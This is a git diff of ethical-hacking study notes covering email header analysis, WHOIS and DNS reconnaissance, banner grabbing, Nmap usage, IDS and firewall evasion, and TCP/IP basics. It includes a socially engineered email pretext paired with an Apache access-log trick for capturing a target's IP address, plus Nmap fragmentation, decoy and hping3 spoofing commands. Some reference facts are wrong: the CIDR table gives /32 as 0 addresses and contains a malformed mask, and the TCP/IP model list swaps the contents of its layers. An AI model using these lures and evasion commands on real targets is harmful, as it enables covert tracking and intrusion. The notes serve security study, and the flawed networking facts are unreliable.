+- By monitoring the email delivery and inspecting the e-mail headers
+- Information includes
+  - IP address of the recipient
+  - Geolocation of the recipient
+  - Delivery information
+  - Visited links
+  - Browser and OS information
+  - Reading time
+- Can track emails using various **email tracking tools**
+  - E.g. notifies sender of the email being delivered and opened by the recipient
+  - Used by marketers, sellers etc.
+
+## Email header analysis
+
+- Helps to determine an e-mail contains something malicious or not
+- Email-headers include
+  - Sender's name
+  - IP/Email address of the sender
+  - Mail server
+  - Mail server authentication system
+  - Send and delivery stamps
+  - Unique number of the message
+
+### Authentication protocol headers
+
+- Allows you to detect forged sender addresses.
+- The goal is for sender to identify itself to the receiver.
+- E-mail headers include information about their pass status
+
+#### SPF: Sender Policy Framework
+
+- E.g. `'PASS' with IP 209.85.220.69` or `'NEUTRAL' ...`
+- Verifies if the domain of the e-mail owned by the sending server.
+  - If not passed, many e-mail providers just block it.
+- Based on e-mail servers who publish records and says "here's the IP addresses we'll send e-mails"
+
+#### DKIM: DomainKeys Identified Mail
+
+- E.g. `'PASS' with domain accounts.google.com`
+- Allows the receiver to verify that an email claimed to have come from a specific domain was authorized by the owner of that domain using a digital signature on the domain.
+
+#### DMARC: Domain-based Message Authentication, Reporting and Conformance
+
+- E.g. `PASS` or `FAIL`
+- Combination of two protocols SPF + DKIM
+- It builds on them and adds more policy
+
+## Verifying email legitimacy
+
+- Double check `FROM`
+- Check the spelling in domain name so it's coming from the domain of the company
+  - If it's random e-mail check if it's from one of the biggest domain providers or if something legit.
+- Check IP of the domain
+  - It can be someones computer (home router IP) or a private server
+  - Major mail service providers checks to determine if domain of the e-mail is tied to the source IP of the e-mail (e.g. have a record)
+    - 🤗 You can tie a public WiFi (e.g. coffee shop) IP to domain and send the e-mails from there.
+
+## E-mail policies
+
+- Different e-mail service provider have different policies regarding to their SMTP
+- 💡 Once hacker recognizes e-mail servers then then he/she can create accounts there, send e-mails back and further to figure out what the rules are.
+- E.g. google does not allow you to see the IP address of the sender
+  - They proxy it behind one of their servers
+  - Workarounds are not so efficient.
+- Each have own ruling list
+  - Determines e.g. what kind of files that can be send
+
+## Getting an IP address from an e-mail
+
+- You can then get IP and a lot from browser headers including
+  - browser information, OS info, device types
+  - Revealing your IP is not safe as even home routers have pretty static IP addresses
+    - Last usually 30 days up to 3 months
+    - 💡 You can still release DHCP lease in your home router settings to get a new IP from the ISP.
+- You can send an image from a back-end server that you own
+  - Some e-mail providers request it and hide users IP
+- You can send a direct link
+  - No e-mail provider can protect you from that
+  - 🤗 Can be done through social engineering e.g.
+    - You know from social media that Bob was celebrating yesterday. You send an e-mail stating "Hi Bob, crew and I had a great time last night, you're never going to guess what Sam did in toilet, threw himself up, check out his pictures"
+  - E.g.
+    1. Install apache `yum install httpd`
+    2. Start apache `systemctl start httpd`
+    3. Create a file: `cd /var/www/html/` then `touch <RESOURCE_NAME>;`
+    4. Check logs live: `tail -f /var/log/httpd/access_log`
+    5. You'll get the IP address when the link (`<IP_ADDRESS>/<RESOURCE_NAME>`) is opened
+       - You can find out self IP address using `curl ifconfig.me`
+    6. And you can look at the location of IP using `geoiplookup <IP_ADDRESS>;`
 # Website footprinting
 
 - Hackers can map the entire website of the target without being noticed
@@ -2763,353 +2677,59 @@
   - E.g. `exiftool TEST_DOCUMENT.docx` would return something like `Microsoft Office Word`, `Version: 16.0`
 - 📝 **[Metagoofil | Google hacking tool](./search-engines-and-online-resources.md#google-hacking-tools)**
   - Search for files that may have metadata for a website using Google and dump their metadata.
-# WHOIS, GeoIpLocation and DNS interrogation
-
-- All public records, accessing is not illegal.
-
-## WHOIS
-
-- Query and response protocol (port 43)
-- Used for retrieving information about assigned Internet resources
-- To get WHOIS information you can
-  - Use different websites such as [whois.net](https://www.whois.net)
-  - Use command-line: `whois cloudarchitecture.io`
-- Two models
-  - **Thick WHOIS**: information from all registrars for the specified set of data.
-  - **Thin WHOIS**: limited information about the specified set of data.
-
-### WHOIS results
-
-- Domain details
-- 📝 Domain owner details
-  - Includes contact information of the owner
-  - Can be hidden by a **WHOIS guard**
-    - A proxy between the owner of the domain and who's accessing
-    - Emails are usually still redirected to the owner.
-      - 💡 Allows for e-mail phishing to learn who the actual owner is.
-- Domain server
-  - Who it's registered with e.g. [NameCheap.com](https://www.namecheap.com), [Gandi.net](https://www.gandi.net)
-  - 💡 Site owner might have account in the server, and you can test passwords there.
-- Net range
-- Domain expiration
-  - 💡 If auto-renewal fails, someone can transfer a domain to another address for malicious behaviors or just to sell it back to you.
-- Creation and last update dates
-
-### Regional internet registries
-
-- WHOIS databases are maintained by the Regional Internet Registries (RIRs) such as:
-  - **ARIN**: American Registry for Internet Numbers
-  - **AFRINIC**: African Network Information Center
-  - **APNIC**: Asia Pacific Network Information Center
-  - **RIPE**: Réseaux IP Européens Network Coordination Centre
-  - **LACNIC**: Latin American and Caribbean Network Information Center
-- 🤗 Every ISP, hosting company etc. must be member of one of the registries to get IP addresses.
-
-## IP geolocation
-
-- Helps find location information about a target
-- Includes country, city, postal code, ISP, and so on
-  - Country is mostly accurate but city, coordinates are not but approximated
-- Helps with social engineering attacks
-- E.g. [GeoIpTool.com](https://geoiptool.com)
-
-### DNS interrogation
-
-- Collecting information about DNS zone data.
-  - e.g. server types and their locations
-- Includes information about key hosts in the network
-- 📝 E.g. `host -t a cloudarchitecture.com`
-  - `t` stands for type of domain record `a` gives A type of domain records.
-  - Returns something likes this:
-
-    ```txt
-        cloudarchitecture.io has address 13.33.17.159
-        cloudarchitecture.io has address 13.33.17.136
-    ```
-
-  - A records returns multiple IP addresses to increase speed and availability e.g. when hosting same content in multiple continents.
-- See also [DNS enumeration](./../04-enumeration/dns-enumeration.md#dns-records)
-
-#### Reverse DNS lookup
-
-- Use one of IP addresses that's listed as an A
-- `host 13.33.17.159`
-  - Returns `159.17.33.13.in-addr.arpa domain name pointer server-13-33-17-159.arn53.r.cloudfront.net.`
-- Multiple IP addresses can be tied to same domain
-  - multiple domain addresses that are tied to the same IP
-
-#### MX records
-
-- Can be retrieved with `-t mx`
-- Exposes which e-mail service they use
-- Have a preference number to tell the SMTP client to try (and retry) each of the relevant addresses in the list in order, until a delivery attempt succeeds
-  - The smallest preference number has the highest priority
-- 💡 Once a hacker know who the e-mail provider is, he/she can create fake-mails using the provider to test e.g.
-  - What kind of content is allowed
-  - If a file be modified so it appears as PDF but make it executable
-  - When an e-mail is labeled as spam / malicious
-# Banner grabbing
-
-- **Banner information** = name + version
-- 📝 Used to gain banner information about
-  - a computer (e.g. OS information)
-  - the services running on its open ports (e.g. nginx server)
-- Allows attackers to exploit known vulnerabilities and form an attack plan.
-- Can be prevented by disabling banners and by hiding web page extensions.
-
-## Passive banner grabbing
-
-- Uses sniffing to determine the operating system.
-- E.g. analyzing error messages, sniffing the traffic on the network, and examining page extensions.
-
-## Active banner grabbing
-
-- Sending a packet to the OS and then analyzing the responses.
-- E.g. each OS have different TCP/IP stack implementations.
-  - Values of TTL (time to live) and TCP window size in the IP header of the first packet are different in each OS.
-- HTTP (80), FTP (21), SMTP (25) are common ports.
-- Tools include `telnet`, [`nmap`](./scanning-tools.md#nmap), [`zgrap`](https://github.com/zmap/zgrab2) and `netcat`.
-
-### Banner grabbing tools
-
-- `nmap -O` for OS automatic fingerprinting, see also [`-O`: OS fingerprinting | Scanning tools](./scanning-tools.md#-o-os-fingerprinting)
-
-#### Netcat
-
-- Networking utility for reading from and writing to network connections using TCP or UDP
-- 🤗 Also known as TCP/IP swiss army knife
-- **FTP**
-  - `nc 178.128.203.1 21`: Checks FTP port 21
-    - 💡 You can use `nmap 178.128.203.1` to find out open ports.
-  - Usual for FTP servers to return something like `Welcome to XXX FTP Server`
-    - gives you insights about the owner and that it's a FTP server
-- **HTTP**
-  - E.g.
-    1. `nc 178.128.203.1 80`
-    2. Type e.g. `GET /index.html HTTP 1.0` or `HEAD / HTTP/1.1`
-    3. Press `[ENTER]`
-  - And also usually useful headers such as `Server: Apache/2.4.6 (CentOS)`
-- [CryptCat](http://cryptcat.sourceforge.net/) is the encrypted version of netcat
-
-#### Telnet
-
-- Application protocol for bidirectional interactive text-oriented communication using a virtual terminal connection
-- Historically used to access to a command-line interface on a remote host but now replaced with [SSH](./../15-cryptography/tunneling-protocols.md#ssh-secure-shell) as it's unsecure.
-- Built into many operative systems as default
-- Runs on port 23 so `telnet <target>` sends TCP to targets port 23.
-  - You can send to different ports using `telnet`
-- If port is open a banner response received looking like:
-  - `Server: Microsoft-IIS/5.0 Date: Fri, 14 Aug 2009 1:14:42 GMT Content-Length:340 Content-Type: text/html`
-# Bypassing IDS and firewall
-
-- Read more on [Intrusion Detection System Detection | Nmap](https://Nmap.org/book/subvert-ids.html#avoid-ids)
-- See also • [Evading IDS](../11-firewalls-ids-and-honeypots/evading-ids.md) and [Evading Firewalls](../11-firewalls-ids-and-honeypots/evading-firewalls.md)
-
-## Packet fragmentation
-
-- Also known as ***IP fragment scanning*** or ***IP fragmentation***
-- 📝 Splitting up TCP header to several smaller (fragmented) packets when sending
-- Server then reassembles them once all packets are received.
-- Usually ignored by IDSes as processing them requires a lot of computer resources
-- Any IP datagram can be fragmented: including UDP, TCP, ICMP, etc.
-- See also [session splicing](./../11-firewalls-ids-and-honeypots/evading-ids.md#session-splicing) for HTTP header variant.
-- Tools
-  - [Nmap](https://Nmap.org/book/man-bypass-firewalls-ids.html):  `-f` flag e.g. `nmap -f <ip-or-host>`
-    - splits the packets into 8 bytes or less after the IP header
-    - Alternatively can use `--mtu` option allows to set bytes e.g. `--mtu 16`
-  - [`fragroute`](https://tools.kali.org/information-gathering/fragroute)
-    - Usage: `fragroute <domain-name>`
-    - Intercept, modify, and rewrite egress traffic to use fragments
-
-## Source routing
-
-- Also called ***path addressing***
-- Specifying which path the malformed packet will take to get to the target host.
-- Used to skip routes (routers/gateways) where firewalls exist
-  - Disregards what route tables say
-- ❗ Almost always blocked
-- Done by modifying IP address field in IP Options field
-  - ![IP datagram](img/ip-datagram.png)
-- Using Nmap:
-  - **Loose routing**
-    - Specifying packet to be loose source routed through given IP way points
-    - E.g. `--ip-options "L 192.168.0.7 192.168.30.9"`
-  - **Strict routing**
-    - You will have to specify every single hop along the path.
-    - E.g.  `--ip-options "S 192.168.0.7 192.168.0.9 .. 192.168.30.9"`
-- See also [IP address spoofing through source routing | Session hijacking](../13-web-applications/session-hijacking.md#ip-address-spoofing-using-source-routing).
-
-## IP address decoy
-
-- Also known as ***decoy scan***
-- All packets originate from the scanning machine, but some have spoofed source addresses.
-- **Pros**: Helps to confuse port scan detection
-- **Cons**
-  - Does not offer any information beyond a regular scan.
-  - Slows down the scanning process
-- Using Nmap:
-  - `nmap -D decoy1,decoy2,ME,decoy3... <target>`: Manual list with custom positioned `ME`
-  - or `nmap -D RND:10 <target>` to randomize 10 decoy IP addresses
-
-## IP address spoofing
-
-- Used to make packet appear to come from someone else
-- Done by changing address information in IP packet header field
-- Replies go back to the spoofed address not to the attacker
-- Mostly used for DoS attacks
-- Tools:
-  - hping: `hping3 <target> -a <spoofed-ip>`
-  - Nmap: `nmap <target> -S <spoofed-ip>`
-
-### IP address spoofing detection techniques
-
-- **Direct TTL probes**
-  - Ping to suspect IP
-  - If `TTL` in reply is not same as suspect packet, it may be spoofed
-- **IP Identification Number**
-  - Ping to suspect IP
-  - `IPID` should be close to but higher than suspect packet
-  - OS increases IP incrementally for each packet sent
-- **TCP Flow Control Method**
-  - **Sliding window protocol**
-    - In TCP, for each packet `ACK` is expected back before sending another packet.
-    - *Window* packets are allowed to be sent without having to wait for an ACK.
-    - Allows packets to arrive out of order
-    - Window size field in TCP header
-      - Tells maximum amount of data sender can transmit without waiting for `ACK`
-      - **Windows update packet** is used to negotiate a different window size.
-  - Attacker that uses spoof IPs do not receive window size information
-  - If victims receives data packets beyond the window size, they are spoofed packets
-
-### IP address spoofing countermeasures
-
-- Use encryption
-  - Best prevention against IP spoofing attacks
-- Avoid trust relationships
-  - Also known as **no trust architecture**
-  - Do not rely on IP-based authentication
-  - Test all packets, even when they come from one of your trusted hosts
-  - E.g. through password authentication, OAuth etc.
-- Use firewalls and filtering mechanisms
-- Use random initial sequence numbers (ISN)
-  - As `SYN` is `ISN+1` it allows malicious connections.
-  - E.g. if it's based on timed counter it's predictable
-- Ingress filtering
-  - Blocking incoming traffic based [access control lists (ACLs)](./../11-firewalls-ids-and-honeypots/firewall-overview.md#access-control-lists-acls)
-  - Good against blocking unauthorized access
-- Egress filtering against insider attacks
-  - Blocking outcoming traffic
-  - Good against insider attacks where e.g. malware can send information
-- [SYN flooding countermeasures](./../13-web-applications/denial-of-service.md#syn-flood-countermeasures)
-
-## Encryption
-
-- 📝 Encryption over e.g. SSL/TLS or SSH is a good evasion as it "cripples" payload inspection.
-- One way to be able to inspect is through **MITM attacks**
-  1. The server-side encryption is terminated at the inspecting firewall
-  2. The firewall re-encrypts the client-side connection and passes data in between.
-- Other solution is to use **Network Traffic Analysis (NTA)**
-  - It focuses more on unencrypted metadata rather than encrypted payload.
-  - It uses behavioral analysis to sort through network traffic and identify dangerous or suspicious traffic based on what the traffic/host does on the network.
-
-## Proxy servers
-
-- Acts as an intermediary for requests from clients and servers
-- `client <--> proxy <--> server`
-- You can use [free public proxies](http://freeproxylists.net/) for educational purposes
-  - ❗ Careful with public proxies as they can be malicious e.g. inject stuff into your traffic.
-  - 💡 Have your own proxies set-up, see [steps for creating a proxy server](./../11-firewalls-ids-and-honeypots/honeypot.md#setting-up-a-proxy-server-as-honeypot)
-
-### Usage by defenders
-
-- As a firewall to protect internal network
-- As a IP address multiplexer hiding IP addresses of internal servers.
-- Anonymize web surfing to some extend e.g. with VPN services or [Tor](https://www.torproject.org/)
-  - Mobile tools include [Shadowsocks](https://shadowsocks.org/en/index.html) (cross-platform sock5 proxy), [proxydroid](https://github.com/madeye/proxydroid) (http / sock4 / sock5 on Android)
-- Filtering unwanted content such as ads
-- Save bandwidth on local networks
-
-### Usage by attackers
-
-- To conceal the real source of the scan.
-- To remotely access intranets/corporate resources using victim as proxy
-- To do man-in-the-middle attacks by redirecting user traffic to the proxy
-- To sniff user data
-- Tools include
-  - [Parox proxy](https://tools.kali.org/13-web-applications/paros) (outdated), or updated fork of it: [OWASP ZAP](https://www.zaproxy.org/)
-
-#### Proxy chaining
-
-- Helps to increase anonymity by using two or more proxies in chain:
-  - like `your_host <--> proxy1 <--> proxy2 <--> target_host`
-
-##### ProxyChains
-
-- 📝 [Open source](https://github.com/rofl0r/proxychains-ng) unix tool to setup a proxy.
-- Download a file using e.g. `proxychains4 wget <fileurl>`
-- Configure through its configuration file `vim /etc/proxychains.conf`
-  - E.g.
-
-    ```txt
-      sock4 127.0.0.1 9050
-      http 159.65.133.175 3128
-      http 50.198.134.65 80
-    ```
-
-### Anonymizer
-
-- Proxy server that acts as an intermediary and privacy shield between a client computer and Internet provider
-- Use-cases include
-  - Bypassing internet censors
-  - Ensuring privacy
-  - Having protection against online attacks
-  - Bypassing IDS and firewall rules (of e.g. companies or schools)
-
-#### Types of anonymizers
-
-- Networked anonymizers
-  - Information is transferred through network of computers
-  - **Pros**: Harder to analyze traffic
-  - **Cons**: Nodes in the sequence can be compromised
-- Single-point anonymizers
-  - Information is transferred through single website
-  - **Pros**: Protects IP and related information
-  - **Cons**: Less resistance to sophisticated analysis
-
-#### Anonymizer tools
-
-- OS
-  - [Tails](https://tails.boum.org/): Live OS to protect against surveillance and censorship
-  - [Whonix](https://www.whonix.org/): Designed to run in VMs to increase security and privacy
-- Software
-  - [Invisible Internet Project (I2P)](https://geti2p.net)
-  - [TunnelBear](https://www.tunnelbear.com)
-- Mobile apps
-  - [Orbot](https://guardianproject.info/apps/org.torproject.android/): Proxy with Tor
-  - [Psiphon](https://psiphon3.com/en/index.html): Tunnel through VPN on Android
-
-##### Tor
-
-- Free and open-source software for enabling anonymous communication
-- 📝 Stronger privacy than single [node proxies](#proxy-servers) or [proxy chains](#proxy-chaining) without encryption
-- ❗ Anonymous as long as guard and exit nodes are not the same party and the traffic is over HTTPs
-- VPN / Proxies (non-chained): Single point of failure
-  - Provider knows who you are and what you browse
-  - Provider may inject packets (e.g. ads) into traffic or record personal details.
-- Tor traffic goes through at least 3 different servers (up to 5000) before destination
-  - Provides separate encryption layer for each server
-  - An observer cannot read or modify packets
-  - Second server (middle relay) passes encrypted data without knowing more than its predecessor and descendant
-  - Weaknesses
-    - ❗ A bad first server (guard node) knows your IP but not what you sent or where.
-    - ❗ A bad third server (exit node) sees your traffic but cannot know who sent the traffic.
-      - ❗ Exit node can eavesdrop if the packet is not using HTTPS but HTTP
-    - ❗ Will be no privacy if both the entry and exit nodes are hijacked by same hostile party.
-
-##### I2P (Invisible Internet Project)
-
-- Peer-to-peer alternative to [Tor](#tor)
-- Each participant acts both as a client and as a router
+# Network footprinting
+
+- Collecting network range information to use the information to map the target's network
+- Gives insights into how the network is structured and which machines belong to the network.
+
+## Nmap
+
+- Used for network discovery
+- Uses raw IP packets to determine e.g.
+  - the available hosts on the network
+  - the services offered by those hosts
+  - operating systems they are
+  - firewall types that are being used
+  - and more...
+- Not only used for malicious purposes but also for checking something is working as intended
+  - e.g. check why a port is open and confirm it's closed
+- E.g. `nmap -v -p 0-2000 -O -sV 178.128.203.1`
+  - `-v`: verbose, more output than usual
+    - `-d` prints even more.
+  - `-p`: for port
+    - default: 0-1024
+    - the higher the ranges is the longer it takes.
+  - `-O`: os detection (best guess)
+  - `-sV`: versions of all detected services (best guess)
+    - 💡 Allows you to check for vulnerabilities of a specific version of that services e.g. through [exploit database](https://www.exploit-db.com/)
+  - `178.128.203.1`: can also specify subnet also e.g. `/24`
+- 🤗 In UK and Germany it's illegal to conduct a scan on a network, more [Nmap | legal issues](https://Nmap.org/book/legal-issues.html)
+- Read more about Nmap in [Nmap | Scanning Tools](./../03-scanning-networks/scanning-tools.md#nmap)
+
+## Traceroute
+
+- 📝 Programs used for discovering routers that are on the path to the target host.
+- You always go through multiple hops before you reach target
+  - E.g. first hop being your router, then routers & switches ISP provider and the router that sends traffic out of the country...
+- Helps hacker to collect information about
+  - network topology
+  - trusted routers
+  - firewall locations
+- Can use protocols such as `ICMP` (often), `TCP`, `UDP`, `DCPP`..
+- ❗ There can be hops that are invisible/undetectable
+  - 💡 You can craft special packets to detect them with custom time to lives, their failure
+- Uses TTL field in the IP header to discover the route.
+  - Starts by setting TTL to 1
+  - Stops at each hop on the way to the destination and providing information to the sender about that hop
+  - The TTL is incremented by 1 for each hop discovered
+- Used to create network diagrams and plan attacks.
+- Helps with e.g. man-in-the-middle attacks.
+- It records IP addresses and DNS names of discovered routers.
+- Commands
+  - Unix tool: `traceroute 178.128.203.1` (uses UDP)
+  - Using Nmap: `nmap traceroute --script traceroute-geolocation 178.128.203.1 -d`
+  - Using hping: `hping3 –traceroute -S {target ip}`
+  - Windows tool: `tracert 178.128.203.1` (uses ICMP)
 # Scanning networks overview
 
 - Process of obtaining additional information about hosts, ports and services in network
@@ -3166,6 +2786,320 @@
 - A popular tool is *`zenmap`*: A GUI for [`nmap`](./scanning-tools.md#nmap)
   - ![zenmap screenshot](img/zenmap.png)
 - E.g. scanning network in a coffee shop. Run `ipconfig` (windows) to get private IP address and subnet range. Then you can scan and create a map.
+# TCP/IP
+
+## TCP connection
+
+### Three-way handshake
+
+- Also known as • **3-way handshake** • **three-way handshake** • **3 way handshake** • **three way handshake**
+- Establishes a TCP connection
+- 📝 Sender: `SYN` → Receiver: `SYN ACK` → Sender: `ACK`
+  - ![Three Way Handshake (TCP)](img/three-way-handshake-tcp.png)
+- `ACK` is then set in every packet sent after the handshake
+
+### Termination
+
+- 📝 Sender: `FIN` → Receiver: `ACK FIN` → Sender: `ACK`
+
+## IPv4
+
+- IPv4 loopback address (localhost of your own machine) is `127.0.0.1`
+
+### IPv4 address types
+
+1. **Unicast**
+   - Acted on by a single recipient
+2. **Multicast**
+   - Acted on only by members of a specific group
+3. **Broadcast**
+   - Acted on by everyone in the network
+   - Two types:
+     - **Limited broadcast**
+       - Delivered to every system inside a domain using:
+         - IP: 255.255.255.255
+         - MAC: FF:FF:FF:FF:FF:FF
+       - Ignored by routers
+     - **Directed broadcasts**
+       - Sent to all devices on subnet
+       - Use subnets broadcast address
+         - E.g. if subnet is 192.168.17.0/24 then it uses 192.168.17.255
+       - Routers may take action on the packets.
+
+## IPv6
+
+- IPv6 uses a 128-bit address instead of the 32-bit IPv4 version
+- Represented as eight groups of four hexadecimal digits separated by colons
+  - E.g. `2001:0db8:85a3:0000:0000:8a2e:0370:7334`
+- Leading zeros can be removed e.g.
+  - Original: `2001:0001:0002:0003:0004:0005:0006:0007`
+  - Short: `2001:1:2:3:4:5:6:7`
+- The loopback address is `::1`
+  - Shortened version of `0000:0000:0000:0000:0000:0000:0000:0001`
+
+## CIDR
+
+- Method of the representing IP addresses
+- 📝 Easy way to find out CIDR ranges, remember: `/24 255.255.255.0 256`
+  - So `/24` gives 256 IP addresses, `/25` gives 128, `/26` gives 64 and so on.
+- IPv4 Notation
+
+  | CIDR Range | Total IP Addresses | Subnet mask |
+  | ---------- | ------------------ | ----------- |
+  | `/32` | 0 | `255.255` |
+  | `/30` | 4 | `.225.252` |
+  | `/28` | 16 | `.255.240` |
+  | `/26` | 64 | `.255.192` |
+  | `/24` | 256 | `.255.0` |
+  | `/22` | 1024 | `.248.0` |
+  | `/20` | 4096 | `.240.0` |
+
+## TCP flags
+
+- Used to indicate a particular connection state or provide additional information
+- Size of each flag is 1 bit being either `0` or `1`
+- 📝 Flag types
+  - **Synchronization (`SYN`)**
+    - Also known as **synchronization** flag.
+    - Synchronize sequence numbers
+    - First step of connection establishment (3-way handshake)
+    - ❗ Only the first packet sent from each end should have this flag set
+  - **Acknowledgement (`ACK`)**
+    - Confirms successful packet retrieval
+  - **Push (`PSH`)**
+    - Tells receiver to process packets instead of buffering them
+  - **Urgent (`URG`)**
+    - Process packets directly before others, even if they're not complete
+  - **Finish (`FIN`)**:
+    - `1` indicate connection termination requests
+    - Used in the last packet sent from the sender.
+  - **Reset (`RST`)**
+    - `1` aborts the connection in response
+    - Sent from the receiver to the sender when a packet is sent to a particular host that was not expecting it.
+    - Also used as
+      - DDoS attack, see [`RST` attack](./../13-web-applications/denial-of-service.md#rst-attack)
+      - Scanning technique, see [RFC 793 scans](./scanning-techniques.md#rfc-793-scans)
+
+### Finish (`FIN`) vs Reset (`RST`)
+
+| `FIN` | `RST` |
+| ----- | ----- |
+| Gracefully termination | Sudden termination |
+| Only one side of conversation is stopped | Whole conversation is stopped |
+| No data loss | Data is discarded |
+| Receiver of `FIN` can choose to continue communicating | Receiver has to stop communication |
+
+### Push (`PSH`) vs Urgent (`URG`)
+
+| `PSH` | `URG` |
+| ----- | ----- |
+| All data in buffer are pushed | Only urgent data is pushed immediately |
+| Data is delivered in sequence | Data is delivered out of sequence |
+
+## TCP/IP sessions
+
+- TCP uses stateful sessions
+- Connection establishment must be done before data transfer
+- **Session initiation**
+  1. Source sends SYN packet
+  2. Destination responds with SYN/ACK packet
+  3. Source sends ACK packet
+  - Connection stays open until closed with `FIN` or `RST` packets.
+- Session termination
+
+## OSI model
+
+- Conceptual model that characterizes and standardizes the communication functions
+- 📝 Uses seven abstraction layers:
+  1. **Physical** (bits)
+     - Media, signal & binary transmission
+     - E.g. • Cables (fiber) • Fiber • Wireless • Hubs • Repeaters
+  2. **Data link** (frames)
+     - Physical addressing: MAC & LLC
+     - E.g. • Ethernet • [PPP](./../15-cryptography/tunneling-protocols.md#ppp-point-to-point-protocol) • Switch • Bridge
+  3. **Network** (packets)
+     - Path determination & IP
+     - E.g. • IP • [ICMP](./scanning-techniques.md#scanning-icmp) • [IPSec](./../15-cryptography/tunneling-protocols.md#ipsec) • IGMP
+  4. **Transport** (segments)
+     - End-to-end connections and reliability
+     - E.g. • TCP • UDP
+  5. **Session** (data)
+     - Sync & send to ports, inter-host communication
+     - E.g. • API's • Sockets • WinSock
+  6. **Presentation** (data)
+     - Syntax layer
+     - Encrypts/decrypts if needed
+     - E.g. • [SSL/TLS](./../15-cryptography/encrypting-communication.md#ssltls) (not entirely) • [SSH](./../15-cryptography/tunneling-protocols.md#ssh-secure-shell)  • IMAP • [FTP](./../15-cryptography/encrypting-communication.md#ftp-file-transfer-protocol) • MPEG • JPEG
+  7. **Application** (data)
+     - End User Layer: network process to application
+     - E.g. • HTTP • [FTP](./../15-cryptography/encrypting-communication.md#ftp-file-transfer-protocol) • IRC • [SSH](./../15-cryptography/tunneling-protocols.md#ssh-secure-shell) • [DNS](./../04-enumeration/dns-enumeration.md#dns) • [SMTP](./../04-enumeration/enumeration-overview.md#smtp)
+- See also • [Firewall types per OSI Layer | Firewall](./../11-firewalls-ids-and-honeypots/firewall-overview.md#firewall-types-per-osi-layer) • [Vulnerability stack | Hacking web applications](./../13-web-applications/hacking-web-applications.md#vulnerability-stack) • [Encryption types per OSI layer | Encryption algorithms](./../15-cryptography/encryption-algorithms.md#encryption-types-per-osi-layer)
+
+## TCP/IP model
+
+- TCP/IP model defines four levels:
+  1. **Link layer**: • [ARP](./../08-sniffing/arp-poisoning.md#arp) • [PPP](./../15-cryptography/tunneling-protocols.md#ppp-point-to-point-protocol) • [MAC](./../08-sniffing/sniffing-attacks-overview.md#mac)
+  2. **Internet layer**: • TCP • UDP • DCCP • SCTP ...
+  3. **Transport layer**: • IP • ICMP • ECN • [IPSec](./../15-cryptography/tunneling-protocols.md#ipsec) ...
+  4. **Application layer**: • [DNS](./../04-enumeration/dns-enumeration.md#dns) • HTTP • HTTPS • [FTP](./../15-cryptography/encrypting-communication.md#ftp-file-transfer-protocol) • [SSH](./../15-cryptography/tunneling-protocols.md#ssh-secure-shell)) • SMTP ...
+- ❗ OSI model does not match well TCP/IP
+  - [RFC 3439](https://tools.ietf.org/html/rfc3439) considers layering "harmful"
+- ❗ E.g. SSL/TLS does not fit in any of OSI or TCP/IP layers
+  - In OSI it's in layer 6 or 7, and, at the same time, in layer 4 or below.
+  - In TCP/IP it's in between the transport and the application layers.
+
+## TCP/IP vs OSI model
+
+| TCP/IP | Protocols and services | OSI model |
+| ------ |:----------------------:| --------- |
+| Application | • HTTP • [FTP](./../15-cryptography/encrypting-communication.md#ftp-file-transfer-protocol) • Telnet • [NTP](./../04-enumeration/enumeration-overview.md#ntp) • DHCP • PING | • Application • Presentation • Session |
+| Transport | • TCP • UDP | Transport |
+| Network | • IP • [ARP](./../08-sniffing/arp-poisoning.md#arp) • [ICMP](./scanning-techniques.md#scanning-icmp) • IGMP | Network |
+| Network interface | • Ethernet • PPTP | • Data Link • Physical |
+# Scanning tools
+
+## Nmap
+
+- Scans network by sending specially crafted packets
+- Allows finding hosts on network with service, OS and firewall information
+- Allows custom scripts written in LUA using **NSE (Nmap Scripting Engine)**
+  - 💡 Can be used to detect and/or exploit vulnerabilities
+  - E.g. can [detect shellshock using nmap scripting engine](./../05-vulnerabilities/common-vulnerabilities.md#detecting-shellshock-using-nmap)
+- Includes
+  - [Ncat](https://Nmap.org/ncat/): reads and writes data across networks from the command
+  - [`ndiff`](https://Nmap.org/ndiff/): compares scan results
+  - [`nping`](https://Nmap.org/nping/): generates packets and analyzes responses
+- 🤗 Used often in movies including Matrix Reloaded, see [the list](https://nmap.org/movies/)
+- See also [Nmap | Network footprinting](./../02-footprinting/network-footprinting.md#nmap) and [Nmap | Vulnerability analysis](./../05-vulnerabilities/vulnerability-analysis.md#nmap).
+
+### [Phases of an Nmap scan](https://Nmap.org/book/Nmap-phases.html)
+
+1. **Script pre-scanning**: Runs NSE scripts that are run once per execution for each targets, e.g. `dhcp-discover`.
+2. **Target enumeration**: Resolves DNS names, CIDR network notations etc. to list of IPv4 or IPv6 addresses
+3. **Host discovery (ping scanning)**: Checking if a host (or which hosts are) is alive before deeper investigation
+4. **Reverse-DNS resolution**: Provides IP numbers for hosts that are alive
+5. **Port scanning**: Probes are sent and remote port states are classified as `open`, `closed`, `filtered`
+6. **Version detection**: Determines what server software is running on remote system
+7. **OS detection**: Determines OS that's running on the port
+8. **Traceroute**: Usually involves another round of reverse-DNS resolution for intermediate hosts.
+9. **Script scanning**: Runs most of the scripts rather than pre-scan and post-scan phases.
+10. **Output**: Prints results using different options e.g. XML
+11. **Script post-scanning**: Runs scripts that process results and deliver final reports and statistics
+
+### Common Nmap options
+
+- 📝 All options are important for a security tester to be able to use Nmap.
+- `-n` (no resolution): Skips DNS resolution and scanning for DNS addresses
+- `-A`: Enable • OS detection • version detection • script scanning • traceroute
+- `--traceroute`: Enables trace routing
+- `--script` or `-SC`: Activates custom script scanning
+
+#### `-s*`: port scan options
+
+- Uses [ICMP echo request](./scanning-techniques.md#scanning-icmp), [TCP SYN](./scanning-techniques.md#syn-scanning) to port 443, [TCP ACK to port 80](./scanning-techniques.md#ack-scanning), and an ICMP timestamp request.
+- `-sn`
+  - Also known as ***ping scan*** or ***host discovery***
+  - Skips port scanning
+- Common commands include:
+  - TCP port scanning: `-sS` ([SYN](./scanning-techniques.md#syn-scanning)), `-sT` ([connect](./scanning-techniques.md#tcp-connect)), `-sN` ([NULL](./scanning-techniques.md#null-scan)), `-sF` ([FIN](./scanning-techniques.md#fin-scan)), `-sX` ([XMAS](./scanning-techniques.md#xmas-scan))
+  - UDP port scanning: `-sU` ([UDP](./scanning-techniques.md#udp-scanning))
+  - `-sV`: service/version detection scan
+  - `-sO`
+    - IP protocol scan
+    - Not really a port scan
+    - Lists supported IP protocols (TCP, ICMP, IGMP etc.) by target system.
+
+#### `-P*`: ping (host discovery) options
+
+- `-P*` options are used to select different ping methods
+- User with `-sn` to skip port scanning and do host discovery only.
+- Common commands include:
